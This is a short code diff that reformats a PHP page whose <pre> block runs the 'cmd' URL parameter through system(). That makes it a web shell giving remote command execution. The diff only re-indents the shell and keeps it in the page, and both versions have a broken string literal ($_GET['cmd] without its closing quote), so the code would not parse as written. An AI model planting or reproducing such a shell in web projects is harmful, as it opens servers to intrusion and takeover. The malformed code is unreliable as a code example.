@@ -6,12 +6,12 @@
     </form>
     <pre>
     <?php
-                                                if(isset($_GET['cmd']))
-                                                {
-                                                  system($_GET['cmd]);
-                                                  }
-                                                  ?>
-                                                  </pre>
-                                                  </body>
-                                                  </html>
-                                                  
+        if(isset($_GET['cmd']))
+        {
+            system($_GET['cmd]);
+        }
+    ?>
+    </pre>
+    </body>
+    </html>
+
